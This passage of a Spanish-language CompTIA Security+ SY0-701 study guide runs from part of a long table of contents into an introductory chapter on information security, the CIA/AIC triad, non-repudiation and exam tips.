      - [Flujo de autenticación 802.1X](#flujo-de-autenticación-8021x)
    - [5.1.8 Aislamiento Físico (Air Gap)](#518-aislamiento-físico-air-gap)
      - [Casos de uso típicos](#casos-de-uso-típicos)
      - [Desafíos del air gap](#desafíos-del-air-gap)
    - [5.1.9 Consideraciones Arquitectónicas](#519-consideraciones-arquitectónicas)
      - [Limitaciones de las redes locales (on-premises)](#limitaciones-de-las-redes-locales-on-premises)
  - [5.2 Dispositivos de Seguridad de la Red](#52-dispositivos-de-seguridad-de-la-red)
    - [5.2.1 Ubicación del Dispositivo](#521-ubicación-del-dispositivo)
      - [Tres opciones de ubicación y tipo de control](#tres-opciones-de-ubicación-y-tipo-de-control)
      - [Ejemplo de colocación en la red (de afuera hacia adentro)](#ejemplo-de-colocación-en-la-red-de-afuera-hacia-adentro)
    - [5.2.2 Atributos del Dispositivo](#522-atributos-del-dispositivo)
      - [Activo vs. Pasivo](#activo-vs-pasivo)
      - [Dispositivos Inline y Métodos de Monitoreo](#dispositivos-inline-y-métodos-de-monitoreo)
      - [Apertura ante Fallas vs. Cierre ante Fallas](#apertura-ante-fallas-vs-cierre-ante-fallas)
    - [5.2.3 Cortafuegos (Firewalls)](#523-cortafuegos-firewalls)
      - [Filtrado de Paquetes con ACL](#filtrado-de-paquetes-con-acl)
      - [Acciones del cortafuegos](#acciones-del-cortafuegos)
      - [Tipos de Cortafuegos según Modo de Despliegue](#tipos-de-cortafuegos-según-modo-de-despliegue)
      - [Cortafuego de Router vs. Dispositivo de Cortafuego](#cortafuego-de-router-vs-dispositivo-de-cortafuego)
    - [5.2.4 Cortafuegos de Capa 4 y 7](#524-cortafuegos-de-capa-4-y-7)
      - [Cortafuego Sin Estado (Stateless)](#cortafuego-sin-estado-stateless)
      - [Cortafuego de Inspección de Estado (Stateful) — Capa 4](#cortafuego-de-inspección-de-estado-stateful--capa-4)
      - [Cortafuego de Capa 7 (Application Layer Firewall)](#cortafuego-de-capa-7-application-layer-firewall)
      - [Nombres equivalentes del cortafuego de capa 7](#nombres-equivalentes-del-cortafuego-de-capa-7)
    - [5.2.5 Servidores Proxy](#525-servidores-proxy)
      - [Proxies Directos (Forward Proxies)](#proxies-directos-forward-proxies)
      - [Proxies Inversos (Reverse Proxies)](#proxies-inversos-reverse-proxies)
    - [5.2.6 Sistemas de Detección de Intrusiones](#526-sistemas-de-detección-de-intrusiones)
      - [Sensores](#sensores)
      - [IDS (Intrusion Detection System — Sistema de Detección de Intrusiones)](#ids-intrusion-detection-system--sistema-de-detección-de-intrusiones)
      - [IPS (Intrusion Prevention System — Sistema de Prevención de Intrusiones)](#ips-intrusion-prevention-system--sistema-de-prevención-de-intrusiones)
    - [5.2.7 Cortafuegos de Próxima Generación (NGFW) y Administración de Amenazas Unificadas (UTM)](#527-cortafuegos-de-próxima-generación-ngfw-y-administración-de-amenazas-unificadas-utm)
      - [NGFW (Next-Generation Firewall — Cortafuego de Próxima Generación)](#ngfw-next-generation-firewall--cortafuego-de-próxima-generación)
      - [UTM (Unified Threat Management — Administración de Amenazas Unificadas)](#utm-unified-threat-management--administración-de-amenazas-unificadas)
      - [Comparación NGFW vs. UTM](#comparación-ngfw-vs-utm)
    - [5.2.8 Balanceadores de Carga](#528-balanceadores-de-carga)
      - [Tipos de Balanceador de Carga](#tipos-de-balanceador-de-carga)
      - [Algoritmos de Programación (Scheduling)](#algoritmos-de-programación-scheduling)
      - [Health Checks (Verificación de Estado)](#health-checks-verificación-de-estado)
      - [Afinidad por IP de Origen y Persistencia de Sesión](#afinidad-por-ip-de-origen-y-persistencia-de-sesión)
    - [5.2.9 Cortafuegos de Aplicaciones Web (WAF)](#529-cortafuegos-de-aplicaciones-web-waf)
      - [Funcionamiento del WAF](#funcionamiento-del-waf)
      - [Implementación del WAF](#implementación-del-waf)
  - [5.3 Comunicaciones Seguras](#53-comunicaciones-seguras)
    - [5.3.1 Arquitectura de Acceso Remoto](#531-arquitectura-de-acceso-remoto)
      - [Topologías de VPN (Virtual Private Network — Red Privada Virtual)](#topologías-de-vpn-virtual-private-network--red-privada-virtual)
      - [Protocolos VPN](#protocolos-vpn)
      - [VPN Sitio a Sitio: Comportamiento](#vpn-sitio-a-sitio-comportamiento)
    - [5.3.2 Túnel de Seguridad de la Capa de Transporte (TLS)](#532-túnel-de-seguridad-de-la-capa-de-transporte-tls)
      - [Cómo funciona una VPN TLS](#cómo-funciona-una-vpn-tls)
      - [Protocolo de transporte para VPN TLS](#protocolo-de-transporte-para-vpn-tls)
      - [Versiones de TLS](#versiones-de-tls)
    - [5.3.3 Túnel de Seguridad del Protocolo de Internet (IPsec)](#533-túnel-de-seguridad-del-protocolo-de-internet-ipsec)
      - [Los Dos Protocolos Principales de IPsec](#los-dos-protocolos-principales-de-ipsec)
      - [Los Dos Modos de IPsec](#los-dos-modos-de-ipsec)
      - [Resumen de combinaciones](#resumen-de-combinaciones)
    - [5.3.4 Intercambio de Claves de Internet (IKE)](#534-intercambio-de-claves-de-internet-ike)
      - [Fases de la negociación IKE](#fases-de-la-negociación-ike)
      - [Versiones de IKE](#versiones-de-ike)
    - [5.3.5 Escritorio Remoto](#535-escritorio-remoto)
      - [RDP (Remote Desktop Protocol — Protocolo de Escritorio Remoto)](#rdp-remote-desktop-protocol--protocolo-de-escritorio-remoto)
      - [Alternativas y soluciones complementarias](#alternativas-y-soluciones-complementarias)
      - [VPN HTML5 / Puerta de enlace sin cliente](#vpn-html5--puerta-de-enlace-sin-cliente)
    - [5.3.6 Shell Seguro (SSH)](#536-shell-seguro-ssh)
      - [Identificación de Servidores SSH](#identificación-de-servidores-ssh)
      - [Métodos de Autenticación del Cliente SSH](#métodos-de-autenticación-del-cliente-ssh)
      - [Comandos SSH Clave](#comandos-ssh-clave)
      - [Gestión de Claves Públicas — Consideraciones de Seguridad](#gestión-de-claves-públicas--consideraciones-de-seguridad)
    - [5.3.7 Gestión Fuera de Banda y Servidores de Salto](#537-gestión-fuera-de-banda-y-servidores-de-salto)
      - [SAW (Secure Administrative Workstation — Estación de Trabajo Administrativa Segura)](#saw-secure-administrative-workstation--estación-de-trabajo-administrativa-segura)
      - [Gestión en Banda vs. Fuera de Banda](#gestión-en-banda-vs-fuera-de-banda)
      - [Jump Server / Bastion Host (Servidor de Salto / Bastión)](#jump-server--bastion-host-servidor-de-salto--bastión)
  - [5.8 Tabla Resumen](#58-tabla-resumen)
    - [Puertos Clave del Tema 5](#puertos-clave-del-tema-5)
    - [Dispositivos por Capa OSI](#dispositivos-por-capa-osi)
    - [Resumen de Controles de Seguridad](#resumen-de-controles-de-seguridad)
  - [5.9 Glosario del Tema 5](#59-glosario-del-tema-5)
- [6 Arquitectura de red segura en la nube](#6-arquitectura-de-red-segura-en-la-nube)
- [6.1 Infraestructura en la Nube](#61-infraestructura-en-la-nube)
  - [6.1.1 Modelos de Despliegue en la Nube](#611-modelos-de-despliegue-en-la-nube)
    - [Tipos de Modelos de Despliegue](#tipos-de-modelos-de-despliegue)
    - [Consideraciones de Seguridad por Arquitectura](#consideraciones-de-seguridad-por-arquitectura)
    - [Nube Híbrida — Desafíos de Seguridad Específicos](#nube-híbrida--desafíos-de-seguridad-específicos)
  - [6.1.2 Modelo de Servicios en la Nube (XaaS)](#612-modelo-de-servicios-en-la-nube-xaas)
    - [Los tres modelos principales](#los-tres-modelos-principales)
    - [Proveedores de Terceros](#proveedores-de-terceros)
  - [6.1.3 Matriz de Responsabilidades (Shared Responsibility Model)](#613-matriz-de-responsabilidades-shared-responsibility-model)
    - [Matriz de Responsabilidades por Modelo de Servicio](#matriz-de-responsabilidades-por-modelo-de-servicio)
    - [Responsabilidades del CSP](#responsabilidades-del-csp)
    - [Responsabilidades del Cliente](#responsabilidades-del-cliente)
  - [6.1.4 Computación Centralizada y Descentralizada](#614-computación-centralizada-y-descentralizada)
    - [Arquitectura Centralizada](#arquitectura-centralizada)
    - [Arquitectura Descentralizada](#arquitectura-descentralizada)
    - [Ejemplos de Arquitectura Descentralizada](#ejemplos-de-arquitectura-descentralizada)
  - [6.1.5 Conceptos de Arquitectura Resiliente](#615-conceptos-de-arquitectura-resiliente)
    - [Alta Disponibilidad (HA — High Availability)](#alta-disponibilidad-ha--high-availability)
    - [Replicación de Datos](#replicación-de-datos)
    - [Niveles de Replicación (Zonas de Disponibilidad)](#niveles-de-replicación-zonas-de-disponibilidad)
  - [6.1.6 Virtualización de Aplicaciones y Contenedores](#616-virtualización-de-aplicaciones-y-contenedores)
    - [Virtualización de Aplicaciones](#virtualización-de-aplicaciones)
    - [Contenedorización](#contenedorización)
    - [Hipervisores](#hipervisores)
    - [VM vs. Contenedores](#vm-vs-contenedores)
  - [6.1.7 Arquitectura en la Nube](#617-arquitectura-en-la-nube)
    - [Computación Sin Servidor (Serverless)](#computación-sin-servidor-serverless)
    - [Microservicios](#microservicios)
    - [Cambios Transformacionales (Servicios Nativos de Nube)](#cambios-transformacionales-servicios-nativos-de-nube)
  - [6.1.8 Tecnologías de Automatización en la Nube](#618-tecnologías-de-automatización-en-la-nube)
    - [Infraestructura como Código (IaC — Infrastructure as Code)](#infraestructura-como-código-iac--infrastructure-as-code)
    - [Tecnologías de Capacidad de Respuesta](#tecnologías-de-capacidad-de-respuesta)
  - [6.1.9 Redes Definidas por Software (SDN — Software-Defined Networking)](#619-redes-definidas-por-software-sdn--software-defined-networking)
    - [Los Tres Planos de Red](#los-tres-planos-de-red)
    - [Arquitectura SDN](#arquitectura-sdn)
    - [NFV (Network Functions Virtualization / Virtualización de Funciones de Red)](#nfv-network-functions-virtualization--virtualización-de-funciones-de-red)
  - [6.1.10 Características de la Arquitectura en la Nube](#6110-características-de-la-arquitectura-en-la-nube)
    - [Características Clave](#características-clave)
    - [SLA e ISA](#sla-e-isa)
  - [6.1.11 Aspectos de Seguridad en la Nube a Considerar](#6111-aspectos-de-seguridad-en-la-nube-a-considerar)
    - [Protección de Datos](#protección-de-datos)
    - [Gestión de Parches](#gestión-de-parches)
    - [SD-WAN (Software-Defined WAN / Red de Área Amplia Definida por Software)](#sd-wan-software-defined-wan--red-de-área-amplia-definida-por-software)
    - [SASE (Secure Access Service Edge / Perímetro de Servicio de Acceso Seguro)](#sase-secure-access-service-edge--perímetro-de-servicio-de-acceso-seguro)
- [6.2 Sistemas Integrados y Arquitectura de Confianza Cero](#62-sistemas-integrados-y-arquitectura-de-confianza-cero)
  - [6.2.1 Sistemas Integrados (Embedded Systems)](#621-sistemas-integrados-embedded-systems)
    - [Aplicaciones de Sistemas Integrados](#aplicaciones-de-sistemas-integrados)
    - [RTOS (Real-Time Operating System / Sistema Operativo en Tiempo Real)](#rtos-real-time-operating-system--sistema-operativo-en-tiempo-real)
    - [Riesgos Asociados a los RTOS](#riesgos-asociados-a-los-rtos)
  - [6.2.2 Sistemas de Control Industrial (ICS — Industrial Control Systems)](#622-sistemas-de-control-industrial-ics--industrial-control-systems)
    - [Componentes de un ICS](#componentes-de-un-ics)
    - [SCADA (Supervisory Control and Data Acquisition / Control de Supervisión y Adquisición de Datos)](#scada-supervisory-control-and-data-acquisition--control-de-supervisión-y-adquisición-de-datos)
    - [Sectores de Aplicación ICS/SCADA](#sectores-de-aplicación-icsscada)
    - [Seguridad en ICS/SCADA](#seguridad-en-icsscada)
  - [6.2.3 Internet de las Cosas (IoT — Internet of Things)](#623-internet-de-las-cosas-iot--internet-of-things)
    - [Componentes del Ecosistema IoT](#componentes-del-ecosistema-iot)
    - [Ejemplos de IoT por Sector](#ejemplos-de-iot-por-sector)
    - [Factores que Impulsan la Adopción de IoT](#factores-que-impulsan-la-adopción-de-iot)
    - [Riesgos de Seguridad de IoT](#riesgos-de-seguridad-de-iot)
    - [Casos Históricos de Ataques IoT](#casos-históricos-de-ataques-iot)
    - [Guías de Mejores Prácticas para IoT](#guías-de-mejores-prácticas-para-iot)
  - [6.2.4 Desperimetrización y Confianza Cero](#624-desperimetrización-y-confianza-cero)
    - [El Problema del Perímetro Tradicional](#el-problema-del-perímetro-tradicional)
    - [Desperimetrización](#desperimetrización)
    - [Tendencias que Impulsan la Desperimetrización](#tendencias-que-impulsan-la-desperimetrización)
    - [Confianza Cero (Zero Trust Architecture — ZTA)](#confianza-cero-zero-trust-architecture--zta)
  - [6.2.5 Conceptos de Seguridad de Confianza Cero](#625-conceptos-de-seguridad-de-confianza-cero)
    - [Conceptos Fundamentales de Zero Trust](#conceptos-fundamentales-de-zero-trust)
    - [Los Planos de Control y Datos en Zero Trust](#los-planos-de-control-y-datos-en-zero-trust)
      - [Plano de Control](#plano-de-control)
      - [Plano de Datos](#plano-de-datos)
    - [Flujo de una Solicitud en Zero Trust (NIST Framework)](#flujo-de-una-solicitud-en-zero-trust-nist-framework)
    - [Zona de Confianza Implícita](#zona-de-confianza-implícita)
    - [Ventajas de la Separación del Plano de Control y Datos](#ventajas-de-la-separación-del-plano-de-control-y-datos)
    - [Ejemplos de Implementaciones de Zero Trust](#ejemplos-de-implementaciones-de-zero-trust)
- [6.3 Glosario de Acrónimos](#63-glosario-de-acrónimos)
- [7 Gestión de Activos y Estrategias de Redundancia](#7-gestión-de-activos-y-estrategias-de-redundancia)
  - [7.1 Gestión de activos](#71-gestión-de-activos)
    - [7.1.1 Seguimiento de activos](#711-seguimiento-de-activos)
      - [Datos típicos en una base de datos de activos](#datos-típicos-en-una-base-de-datos-de-activos)
      - [Asignación/contabilización de activos](#asignacióncontabilización-de-activos)
      - [Métodos de enumeración de activos](#métodos-de-enumeración-de-activos)
      - [Adquisición/compra de activos — consideraciones de seguridad](#adquisicióncompra-de-activos--consideraciones-de-seguridad)
    - [7.1.3 Copias de seguridad de datos](#713-copias-de-seguridad-de-datos)
      - [Por qué las técnicas simples son insuficientes en entornos empresariales](#por-qué-las-técnicas-simples-son-insuficientes-en-entornos-empresariales)
      - [Funcionalidades críticas en soluciones empresariales de backup](#funcionalidades-críticas-en-soluciones-empresariales-de-backup)
      - [Desduplicación de datos](#desduplicación-de-datos)
      - [Frecuencia de copias de seguridad](#frecuencia-de-copias-de-seguridad)
      - [Copias en las instalaciones vs. fuera de las instalaciones](#copias-en-las-instalaciones-vs-fuera-de-las-instalaciones)
      - [Validación de recuperación](#validación-de-recuperación)
    - [7.1.4 Protección avanzada de datos](#714-protección-avanzada-de-datos)
      - [Instantáneas (Snapshots)](#instantáneas-snapshots)
      - [Replicación](#replicación)
      - [Registro por diario (Journaling)](#registro-por-diario-journaling)
      - [Cifrado de copias de seguridad](#cifrado-de-copias-de-seguridad)
    - [7.1.5 Destrucción segura de datos](#715-destrucción-segura-de-datos)
      - [Cuándo se requiere destrucción de datos](#cuándo-se-requiere-destrucción-de-datos)
      - [Métodos por tipo de medio](#métodos-por-tipo-de-medio)
      - [Métodos de sobrescritura para HDD](#métodos-de-sobrescritura-para-hdd)
      - [Enajenación de activos — conceptos clave](#enajenación-de-activos--conceptos-clave)
  - [7.2 Estrategias de redundancia](#72-estrategias-de-redundancia)
    - [7.2.1 Continuidad de las operaciones](#721-continuidad-de-las-operaciones)
      - [COOP (Continuity of Operations Planning)](#coop-continuity-of-operations-planning)
      - [COOP vs. Continuidad del negocio (BC)](#coop-vs-continuidad-del-negocio-bc)
      - [Planificación de la capacidad](#planificación-de-la-capacidad)
    - [7.2.2 Riesgos de la planificación de la capacidad](#722-riesgos-de-la-planificación-de-la-capacidad)
      - [Riesgos para las personas](#riesgos-para-las-personas)
      - [Tecnologías para trabajo remoto](#tecnologías-para-trabajo-remoto)
      - [Riesgos de despidos (impacto en seguridad)](#riesgos-de-despidos-impacto-en-seguridad)
      - [Riesgos de planificación deficiente vs. sobreestimación](#riesgos-de-planificación-deficiente-vs-sobreestimación)
    - [7.2.3 Alta disponibilidad](#723-alta-disponibilidad)
      - [Definición y métricas](#definición-y-métricas)
      - [Tabla de "los nueves"](#tabla-de-los-nueves)
      - [Escalabilidad y elasticidad](#escalabilidad-y-elasticidad)
      - [Tolerancia a fallas y redundancia](#tolerancia-a-fallas-y-redundancia)
      - [Consideraciones del sitio (Site Resilience)](#consideraciones-del-sitio-site-resilience)
      - [La nube como DR (Disaster Recovery)](#la-nube-como-dr-disaster-recovery)
      - [Prueba de redundancia y HA](#prueba-de-redundancia-y-ha)
    - [7.2.4 Agrupamiento o clustering](#724-agrupamiento-o-clustering)
      - [Clúster vs. Balanceador de carga](#clúster-vs-balanceador-de-carga)
      - [IP Virtual (VIP — Virtual IP Address)](#ip-virtual-vip--virtual-ip-address)
      - [Clustering Activo/Pasivo (A/P) vs. Activo/Activo (A/A)](#clustering-activopasivo-ap-vs-activoactivo-aa)
      - [Configuraciones N+1 y N+M](#configuraciones-n1-y-nm)
      - [Agrupamiento de aplicaciones](#agrupamiento-de-aplicaciones)
    - [7.2.5 Redundancia de energía](#725-redundancia-de-energía)
      - [Cadena de suministro eléctrico (de mayor a menor urgencia)](#cadena-de-suministro-eléctrico-de-mayor-a-menor-urgencia)
      - [Componentes clave](#componentes-clave)
      - [Consideraciones sobre generadores](#consideraciones-sobre-generadores)
    - [7.2.6 Diversidad y defensa en profundidad](#726-diversidad-y-defensa-en-profundidad)
      - [Diversidad de plataformas](#diversidad-de-plataformas)
      - [Defensa en profundidad (Defense in Depth)](#defensa-en-profundidad-defense-in-depth-1)
      - [Diversidad de proveedores](#diversidad-de-proveedores)
      - [Estrategia multinube (Multi-cloud)](#estrategia-multinube-multi-cloud)
    - [7.2.7 Tecnologías de engaño](#727-tecnologías-de-engaño)
      - [Herramientas de engaño y disrupción](#herramientas-de-engaño-y-disrupción)
      - [Estrategias de disrupción](#estrategias-de-disrupción)
    - [7.2.8 Prueba de resiliencia](#728-prueba-de-resiliencia)
      - [Métodos de prueba](#métodos-de-prueba)
      - [Consecuencias de NO realizar pruebas](#consecuencias-de-no-realizar-pruebas)
      - [Documentación en continuidad del negocio](#documentación-en-continuidad-del-negocio)
  - [7.3 Seguridad Física](#73-seguridad-física)
    - [7.3.1 Controles de seguridad física](#731-controles-de-seguridad-física)
      - [Implementación por zonas](#implementación-por-zonas)
    - [7.3.2 Plano del sitio, rejas e iluminación](#732-plano-del-sitio-rejas-e-iluminación)
      - [CPTED (Crime Prevention Through Environmental Design)](#cpted-crime-prevention-through-environmental-design)
      - [Barricadas y puntos de entrada/salida](#barricadas-y-puntos-de-entradasalida)
      - [Cercado (Fencing)](#cercado-fencing)
      - [Iluminación de seguridad](#iluminación-de-seguridad)
      - [Bolardos](#bolardos)
      - [Principios para estructuras existentes](#principios-para-estructuras-existentes)
    - [7.3.3 Puertas de entrada y cerraduras](#733-puertas-de-entrada-y-cerraduras)
      - [Tipos de cerradura](#tipos-de-cerradura)
      - [Vestíbulo de control de acceso (Mantrap / Airlock)](#vestíbulo-de-control-de-acceso-mantrap--airlock)
      - [Cerraduras de cable (Cable Locks)](#cerraduras-de-cable-cable-locks)
      - [Credenciales de acceso](#credenciales-de-acceso)
      - [PACS (Physical Access Control System — Sistema de Control de Acceso Físico)](#pacs-physical-access-control-system--sistema-de-control-de-acceso-físico)
    - [7.3.4 Cámaras y guardias de seguridad](#734-cámaras-y-guardias-de-seguridad)
      - [Guardias de seguridad](#guardias-de-seguridad)
      - [Videovigilancia (CCTV)](#videovigilancia-cctv)
      - [Vigilancia inteligente (IA y Machine Learning)](#vigilancia-inteligente-ia-y-machine-learning)
    - [7.3.5 Sistemas de alarma y sensores](#735-sistemas-de-alarma-y-sensores)
      - [Tipos de alarmas](#tipos-de-alarmas)
      - [Tipos de sensores](#tipos-de-sensores)
  - [7.4 Glosario](#74-glosario)
  - [8 Gestión de vulnerabilidades](#8-gestión-de-vulnerabilidades)
  - [8.1 Vulnerabilidades de Dispositivos y Sistemas Operativos](#81-vulnerabilidades-de-dispositivos-y-sistemas-operativos)
    - [8.1.1 Vulnerabilidades del Sistema Operativo](#811-vulnerabilidades-del-sistema-operativo)
      - [Tabla Comparativa de SO y sus Vulnerabilidades](#tabla-comparativa-de-so-y-sus-vulnerabilidades)
      - [Casos Históricos Clave para el Examen](#casos-históricos-clave-para-el-examen)
    - [8.1.2 Tipos de Vulnerabilidad y Explotación](#812-tipos-de-vulnerabilidad-y-explotación)
      - [Sistemas Heredados y de Fin de Vida (EOL)](#sistemas-heredados-y-de-fin-de-vida-eol)
      - [Vulnerabilidades de Firmware](#vulnerabilidades-de-firmware)
      - [Vulnerabilidades de Virtualización](#vulnerabilidades-de-virtualización)
    - [8.1.3 Vulnerabilidades de Día Cero](#813-vulnerabilidades-de-día-cero)
      - [Características Clave](#características-clave-1)
      - [Proceso de Divulgación Responsable](#proceso-de-divulgación-responsable)
    - [8.1.4 Vulnerabilidades de Configuración Errónea](#814-vulnerabilidades-de-configuración-errónea)
      - [Orígenes Comunes](#orígenes-comunes)
      - [Principios para Mitigar Configuraciones Erróneas](#principios-para-mitigar-configuraciones-erróneas)
    - [8.1.5 Vulnerabilidades Criptográficas](#815-vulnerabilidades-criptográficas)
      - [Algoritmos Débiles y Ataques](#algoritmos-débiles-y-ataques)
      - [Ataques Conocidos a Protocolos Criptográficos](#ataques-conocidos-a-protocolos-criptográficos)
      - [SSL/TLS — Usos](#ssltls--usos)
      - [Protección de Claves Criptográficas](#protección-de-claves-criptográficas)
    - [8.1.6 Instalación Lateral, Rooting y Jailbreaking](#816-instalación-lateral-rooting-y-jailbreaking)
      - [Definiciones](#definiciones)
      - [Riesgos para las Organizaciones](#riesgos-para-las-organizaciones)
      - [Herramientas y Términos Relacionados](#herramientas-y-términos-relacionados)
      - [Marco Regulatorio](#marco-regulatorio)
      - [Permisos de Aplicaciones](#permisos-de-aplicaciones)
  - [8.2 Vulnerabilidades de Aplicaciones y de la Nube](#82-vulnerabilidades-de-aplicaciones-y-de-la-nube)
    - [8.2.1 Vulnerabilidades de Aplicación](#821-vulnerabilidades-de-aplicación)
      - [Condición de Carrera y TOCTOU](#condición-de-carrera-y-toctou)
      - [Inyección de Memoria](#inyección-de-memoria)
      - [Buffer Overflow (Desbordamiento de Búfer)](#buffer-overflow-desbordamiento-de-búfer)
      - [Actualización Maliciosa (Malicious Update)](#actualización-maliciosa-malicious-update)
    - [8.2.2 Alcance de la Evaluación](#822-alcance-de-la-evaluación)
      - [Prácticas del Alcance de Evaluación](#prácticas-del-alcance-de-evaluación)
      - [Pentester vs. Atacante](#pentester-vs-atacante)
    - [8.2.3 Ataques a las Aplicaciones Web](#823-ataques-a-las-aplicaciones-web)
      - [XSS — Cross-Site Scripting (Secuencias de Comandos en Sitios Cruzados)](#xss--cross-site-scripting-secuencias-de-comandos-en-sitios-cruzados)
      - [SQLi — SQL Injection (Inyección de Código SQL)](#sqli--sql-injection-inyección-de-código-sql)
    - [8.2.4 Ataques a las Aplicaciones con Base en la Nube](#824-ataques-a-las-aplicaciones-con-base-en-la-nube)
      - [Características Únicas de Ataques en la Nube](#características-únicas-de-ataques-en-la-nube)
      - [Tipos de Ataques Específicos de la Nube](#tipos-de-ataques-específicos-de-la-nube)
      - [CASB — Cloud Access Security Broker](#casb--cloud-access-security-broker)
    - [8.2.5 Cadena de Suministro](#825-cadena-de-suministro)
      - [Tipos de Proveedores y sus Riesgos](#tipos-de-proveedores-y-sus-riesgos)
      - [SBOM — Software Bill of Materials (Lista de Materiales del Software)](#sbom--software-bill-of-materials-lista-de-materiales-del-software)
      - [Herramientas y Estándares SBOM](#herramientas-y-estándares-sbom)
  - [8.3 Métodos de Identificación de Vulnerabilidades](#83-métodos-de-identificación-de-vulnerabilidades)
    - [8.3.1 Escaneo de Vulnerabilidades](#831-escaneo-de-vulnerabilidades)
      - [Herramientas de Escaneo de Red](#herramientas-de-escaneo-de-red)
      - [Escaneos Con y Sin Credenciales](#escaneos-con-y-sin-credenciales)
      - [Escaneo de Vulnerabilidades de Aplicaciones](#escaneo-de-vulnerabilidades-de-aplicaciones)
      - [Monitoreo de Paquetes (Package Monitoring)](#monitoreo-de-paquetes-package-monitoring)
    - [8.3.2 Fuentes de Amenazas (Threat Feeds)](#832-fuentes-de-amenazas-threat-feeds)
      - [Tipos de Investigación de Amenazas](#tipos-de-investigación-de-amenazas)
      - [CTI — Cyber Threat Intelligence](#cti--cyber-threat-intelligence)
      - [Plataformas de Threat Intelligence (Propietarias)](#plataformas-de-threat-intelligence-propietarias)
      - [Fuentes de Código Abierto vs. Propietarias](#fuentes-de-código-abierto-vs-propietarias)
      - [Organizaciones de Intercambio de Información](#organizaciones-de-intercambio-de-información)
      - [OSINT — Open Source Intelligence (Inteligencia de Fuentes Abiertas)](#osint--open-source-intelligence-inteligencia-de-fuentes-abiertas)
    - [8.3.3 Deep y Dark Web](#833-deep-y-dark-web)
      - [Capas de la Web](#capas-de-la-web)
      - [TOR — The Onion Router](#tor--the-onion-router)
      - [Usos de la Dark Web](#usos-de-la-dark-web)
    - [8.3.4 Otros Métodos de Evaluación de Vulnerabilidades](#834-otros-métodos-de-evaluación-de-vulnerabilidades)
      - [Pentest (Prueba de Penetración)](#pentest-prueba-de-penetración)
      - [Tipos de Pentest por Conocimiento del Entorno](#tipos-de-pentest-por-conocimiento-del-entorno)
      - [Bug Bounty (Recompensas por Detección de Errores)](#bug-bounty-recompensas-por-detección-de-errores)
      - [Auditoría](#auditoría)
  - [8.4 Análisis y Corrección de Vulnerabilidades](#84-análisis-y-corrección-de-vulnerabilidades)
    - [8.4.1 Vulnerabilidades y Exposiciones Comunes (CVE, NVD, CVSS, SCAP)](#841-vulnerabilidades-y-exposiciones-comunes-cve-nvd-cvss-scap)
      - [Fuente de Vulnerabilidades (Vulnerability Feed)](#fuente-de-vulnerabilidades-vulnerability-feed)
      - [CVE — Common Vulnerabilities and Exposures](#cve--common-vulnerabilities-and-exposures)
      - [NVD — National Vulnerability Database](#nvd--national-vulnerability-database)
      - [CVSS — Common Vulnerability Scoring System](#cvss--common-vulnerability-scoring-system)
      - [SCAP — Security Content Automation Protocol](#scap--security-content-automation-protocol)
    - [8.4.2 Falsos Positivos, Falsos Negativos y Revisión de Registros](#842-falsos-positivos-falsos-negativos-y-revisión-de-registros)
      - [Informes de Escaneo](#informes-de-escaneo)
      - [Falsos Positivos y Falsos Negativos](#falsos-positivos-y-falsos-negativos)
      - [Revisión de Registros para Validación](#revisión-de-registros-para-validación)
    - [8.4.3 Análisis de Vulnerabilidades](#843-análisis-de-vulnerabilidades)
      - [Dimensiones del Análisis](#dimensiones-del-análisis)
      - [Variables Ambientales en el Análisis](#variables-ambientales-en-el-análisis)
      - [Tolerancia al Riesgo (Risk Tolerance)](#tolerancia-al-riesgo-risk-tolerance)
    - [8.4.4 Respuesta y Corrección de Vulnerabilidades](#844-respuesta-y-corrección-de-vulnerabilidades)
      - [Prácticas de Corrección (Remediation)](#prácticas-de-corrección-remediation)
      - [Validación de la Corrección](#validación-de-la-corrección)
      - [Informes de Vulnerabilidades](#informes-de-vulnerabilidades)
  - [8.5 Glosario](#85-glosario)
  

# 1. Conceptos Fundamentales de Seguridad

La seguridad no es un producto o un estado estático; es un **proceso continuo** que abarca desde la evaluación inicial de requisitos hasta la disuasión activa de los atacantes.

## 1.1.1 Seguridad de la Información (Infosec)

### ¿Qué es la Seguridad de la Información?

La **seguridad de la información** (infosec, por *Information Security*) se refiere a la **protección de recursos de datos** contra:
- Accesos no autorizados
- Ataques
- Robos
- Daños

Los datos pueden ser vulnerables en tres estados:
- **Almacenados** (datos en reposo)
- **Transferidos** (datos en tránsito)
- **Procesados** (datos en uso)

> **Analogía del mundo real:** Imagina un banco. El dinero (los datos) debe ser accesible solo para los titulares de la cuenta (confidencialidad), los saldos no deben modificarse sin transacciones válidas (integridad) y los cajeros ATM deben funcionar 24/7 (disponibilidad).

### Tríada CIA (también llamada AIC)

| Propiedad | Definición | Ejemplo práctico |
|---|---|---|
| **C — Confidencialidad** *(Confidentiality)* | Solo personas autorizadas pueden leer la información | Solo tu médico puede ver tu historial clínico |
| **I — Integridad** *(Integrity)* | Los datos se almacenan y transfieren tal como se prevé; modificaciones no autorizadas están prohibidas | El saldo de tu cuenta bancaria no cambia sin una transacción válida |
| **A — Disponibilidad** *(Availability)* | La información está accesible para usuarios autorizados cuando la necesitan | Los servidores de tu banco deben estar operativos cuando quieras hacer una transferencia |

> **Analogía:** La tríada CIA es como las tres patas de un taburete: si falta una, el sistema se cae.

> **Nota importante:** La tríada también se denomina **AIC** (Availability, Integrity, Confidentiality) para evitar confusiones con la Agencia Central de Inteligencia (CIA).

### No Repudio

**Definición:** El **no repudio** significa que una persona **no puede negar** haber realizado una acción, como:
- Crear un recurso
- Modificar un recurso
- Enviar un recurso

**Ejemplo:** Un testamento debe ser atestiguado al firmarse. Si hay disputa, el testigo proporciona evidencia de que se ejecutó correctamente.

> **Analogía:** Cuando firmas un contrato ante notario, no puedes después afirmar que nunca lo firmaste. El notario es la prueba de no repudio.

> El no repudio es identificado por algunos modelos de seguridad como una **cuarta propiedad esencial** además de la tríada CIA.


> **👉 Enfoque de Examen SY0-701:**
> CompTIA pregunta frecuentemente sobre qué propiedad de la tríada CIA se ve comprometida en un escenario dado. Distractores comunes:
> - Confundir **integridad** con **disponibilidad** (un ataque que corrompe datos vs. uno que los hace inaccesibles).
> - Pensar que el **no repudio** es parte oficial de la tríada: **NO lo es**, es una propiedad adicional.
> - La tríada se puede llamar **CIA o AIC** — ambas son correctas; no te dejes confundir por el orden.
> - Vigilar preguntas como: *"¿Qué propiedad garantiza que un empleado no pueda negar haber enviado un correo electrónico?"* → Respuesta: **No repudio**.


## 1.1.2 Marco de Ciberseguridad (CSF)

### ¿Qué es la Ciberseguridad?

La **ciberseguridad** hace referencia al **aprovisionamiento de hardware y software de procesamiento seguro** de forma específica. Es un subconjunto de la seguridad de la información centrado en los sistemas digitales.

